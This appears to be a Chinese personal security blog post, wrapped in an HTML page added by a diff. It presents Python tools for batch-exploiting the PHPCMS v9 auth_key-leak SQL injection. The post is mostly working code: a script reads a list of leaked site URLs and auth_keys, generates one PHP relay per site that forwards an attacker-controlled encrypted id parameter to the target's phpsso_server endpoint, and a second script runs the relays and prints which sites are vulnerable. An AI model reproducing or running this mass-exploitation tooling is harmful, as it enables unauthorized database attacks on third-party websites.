@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="phpcms auth_key注入漏洞批量检测前言：一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了我们只需要写个批量检测就行了。  思路：1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html 2.居然">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcmssqllin">
+<meta property="og:url" content="http://422926799.github.io/posts/d74d279d.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="phpcms auth_key注入漏洞批量检测前言：一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了我们只需要写个批量检测就行了。  思路：1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html 2.居然">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&fm=27&gp=0.jpg">
+<meta property="og:image" content="https://i.imgur.com/bP9cbAG.png">
+<meta property="og:image" content="https://i.imgur.com/9490Rej.png">
+<meta property="og:image" content="https://i.imgur.com/2EyNcfM.png">
+<meta property="og:image" content="https://i.imgur.com/939Jan6.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.211Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcmssqllin">
+<meta name="twitter:description" content="phpcms auth_key注入漏洞批量检测前言：一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了我们只需要写个批量检测就行了。  思路：1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html 2.居然">
+<meta name="twitter:image" content="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&fm=27&gp=0.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>phpcmssqllin</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/8284a757.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/8a2431fe.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/d74d279d.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/d74d279d.html&text=phpcmssqllin"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/d74d279d.html&is_video=false&description=phpcmssqllin"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpcmssqllin&body=Check out this article: http://422926799.github.io/posts/d74d279d.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/d74d279d.html&name=phpcmssqllin&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpcms-auth-key注入漏洞批量检测"><span class="toc-number">1.</span> <span class="toc-text">phpcms auth_key注入漏洞批量检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.2.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-number">1.3.</span> <span class="toc-text">正文：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        phpcmssqllin
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-07-28T13:31:55.000Z" itemprop="datePublished">2018-07-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="phpcms-auth-key注入漏洞批量检测"><a href="#phpcms-auth-key注入漏洞批量检测" class="headerlink" title="phpcms auth_key注入漏洞批量检测"></a>phpcms auth_key注入漏洞批量检测</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了<br>我们只需要写个批量检测就行了。</p>
+<p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&amp;fm=27&amp;gp=0.jpg" alt=""></p>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><pre><code>1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html
+2.居然已经给出了PHP的中专检测脚本，我们只需要批量替换掉php检测脚本的URL和key。然后生成新的修改好的PHP文件放入一个目录即可
+3.然后把生成的目录放入你的PHP环境，进行读取该路径下的所有PHP文件名。然后发送请求判断返回结果是0还是-1即可。（0代表无漏洞，-1代表有漏洞）
+</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>jsqllin.py</p>
+<pre><code>import requests
+import os
+import re
+
+keys=[]
+#if os.path.exists(&apos;v9.php&apos;):
+ #   print(&apos;[+]ok v9.php&apos;)
+##  print(&apos;[-]not found v9.php&apos;)
+  #  exit()
+
+xs=open(&apos;saveurl.txt&apos;,&apos;w&apos;)
+xs.close()
+
+print(&apos;[+]Write url&apos;)
+dw=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)
+for j in dw.readlines():
+    ldw=&quot;&quot;.join(j.split(&apos;\n&apos;))
+    qe = re.finditer(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;, ldw) //正则提取出URL
+    for q in qe:
+        rc = re.findall(&quot;[a-zA-z]+://[^\s]*&quot;, str(q))
+        for j in rc:
+            we = &quot;{}&quot;.format(j).replace(&apos;&gt;&apos;, &apos;&apos;).replace(&quot;&apos;&quot;, &apos;&apos;)
+            print(we,file=open(&apos;saveurl.txt&apos;,&apos;a&apos;))
+
+wc=[]
+lo=open(&apos;keys.txt&apos;,&apos;w&apos;)
+lo.close()
+
+dkv=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)
+for r in dkv.readlines():
+    wq=&quot;&quot;.join(r.split(&apos;\n&apos;))
+    qe=re.sub(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;,&apos;&apos;,wq)
+    qc=re.sub(&apos;\|&apos;,&apos;&apos;,str(qe))
+    tx=re.findall(&apos;[a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9]&apos;,str(qc)) //正则提取出key
+    for k in tx:
+        print(k,file=open(&apos;keys.txt&apos;,&apos;a&apos;))
+
+
+pds2=[]
+wqe2=[]
+pds=open(&apos;saveurl.txt&apos;,&apos;r&apos;)
+wqe=open(&apos;keys.txt&apos;,&apos;r&apos;)
+for b in pds.readlines():
+    pds2.append(&quot;&quot;.join(b.split(&apos;\n&apos;)))
+
+for w in wqe.readlines():
+    wqe2.append(&quot;&quot;.join(w.split(&apos;\n&apos;)))
+
+for x in range(int(len(pds2))): //读取pds（key列表里面的长度）生成对应数量的PHP文件
+    os.mknod(&apos;scv/{}v9.php&apos;.format(x))
+
+dr=os.listdir(&apos;scv&apos;) //读取scv目录下所有的PHP文件
+for d in range(0,len(pds2)):
+    print(&quot;&quot;&quot;&lt;?php
+set_time_limit(0);
+$wang_url = &apos;{}&apos;; &quot;&quot;&quot;.format(pds2[d])+&quot;&quot;&quot; 
+$auth_key = &apos;{}&apos;;&quot;&quot;&quot;.format(wqe2[d])+&quot;&quot;&quot; 
+$str = &quot;uid=1&quot; . stripslashes($_GET[&apos;id&apos;]);
+$encode = sys_auth($str, &apos;ENCODE&apos;, $auth_key);
+$content = file_get_contents($wang_url . &quot;/phpsso_server/?m=phpsso&amp;c=index&amp;a=getuserinfo&amp;appid=1&amp;data=&quot; . $encode);
+echo $content;
+function sys_auth($string, $operation = &apos;ENCODE&apos;, $key = &apos;&apos;, $expiry = 0)
+{
+    $key_length = 4;
+    $key = md5($key);
+    $fixedkey = hash(&apos;md5&apos;, $key);
+    $egiskeys = md5(substr($fixedkey, 16, 16));
+    $runtokey = $key_length ? ($operation == &apos;ENCODE&apos; ? substr(hash(&apos;md5&apos;, microtime(true)), -$key_length) : substr($string, 0, $key_length)) : &apos;&apos;;
+    $keys = hash(&apos;md5&apos;, substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
+    $string = $operation == &apos;ENCODE&apos; ? sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
+    $i = 0;
+    $result = &apos;&apos;;
+    $string_length = strlen($string);
+    for ($i = 0; $i &lt; $string_length; $i++) {
+        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
+    }
+    if ($operation == &apos;ENCODE&apos;) {
+        return $runtokey . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));
+    } else {
+        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {
+            return substr($result, 26);
+        } else {
+            return &apos;&apos;;
+        }
+    }
+}
+?&gt;
+
+    &quot;&quot;&quot;,file=open(&apos;scv/{}&apos;.format(dr[d]),&apos;a&apos;)) //这个公司会将修改好的逐个写入
+</code></pre><p>jiances.py</p>
+<pre><code>import requests
+import os
+print(&apos;[!]请确保你把生成的php文件夹拷贝到你的php环境目录之下，然后请输入目录的路径。我将获取路径下所有的文件进行检测&apos;)
+user=input(&apos;path:&apos;)
+
+xj=open(&apos;save.txt&apos;,&apos;w&apos;)
+xj.close()
+
+def exploitsqllin():
+    cs=os.listdir(user) //读取指定列表下的所有文件
+    headers={&apos;user-gent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}
+    for s in cs: //遍历
+        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;)) //写入txt
+
+    dk=open(&apos;save.txt&apos;,&apos;r&apos;) 
+    for r in dk.readlines():
+        wed=&quot;&quot;.join(r.split(&apos;\n&apos;))
+        urls=&apos;http://127.0.0.1/scv/{}?id=1&apos;.format(wed) //遍历txt之后构造URL
+        rq=requests.get(url=urls,headers=headers) //发送请求进行判断
+        if &apos;0&apos; in rq.text: 
+            print(&apos;[-]Not bug {}&apos;.format(rq.url))
+        elif &apos;-1&apos; in rq.text:
+            print(&apos;[+]Bug url {}&apos;.format(rq.url))
+exploitsqllin()
+</code></pre><p>图片：</p>
+<p>生成的php<br><img src="https://i.imgur.com/bP9cbAG.png" alt=""></p>
+<p><img src="https://i.imgur.com/9490Rej.png" alt=""></p>
+<p>检测结果：<br><img src="https://i.imgur.com/2EyNcfM.png" alt=""></p>
+<p><img src="https://i.imgur.com/939Jan6.png" alt=""></p>
+<p>漏洞几率不是很大</p>
+<pre><code>[-]Not bug http://127.0.0.1/scv/79v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/66v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/2v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/45v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/47v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/74v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/91v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/90v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/88v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/57v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/89v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/78v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/14v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/5v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/15v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/63v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/76v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/87v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/26v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/72v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/43v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/84v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/25v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/92v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/13v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/71v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/75v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/56v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/19v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/50v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/31v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/41v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/53v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/37v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/44v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/85v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/42v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/52v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/17v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/64v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/80v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/3v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/4v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/58v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/68v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/48v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/20v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/38v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/62v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/29v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/24v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/32v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/61v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/86v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/46v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/33v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/39v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/1v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/51v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/93v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/36v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/81v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/83v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/27v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/55v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/23v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/12v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/95v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/40v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/0v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/77v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/35v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/73v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/21v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/18v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/65v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/16v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/34v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/59v9.php?id=1
+[+]Bug url http://127.0.0.1/scv/94v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/10v9.php?id=1
+[-]Not bug http://127.0.0.1/scv/22v9.php?id=1
+</code></pre><p>转载请声明：来之九世的博客</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpcms-auth-key注入漏洞批量检测"><span class="toc-number">1.</span> <span class="toc-text">phpcms auth_key注入漏洞批量检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.2.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-number">1.3.</span> <span class="toc-text">正文：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/d74d279d.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/d74d279d.html&text=phpcmssqllin"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/d74d279d.html&is_video=false&description=phpcmssqllin"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpcmssqllin&body=Check out this article: http://422926799.github.io/posts/d74d279d.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/d74d279d.html&title=phpcmssqllin"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/d74d279d.html&name=phpcmssqllin&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
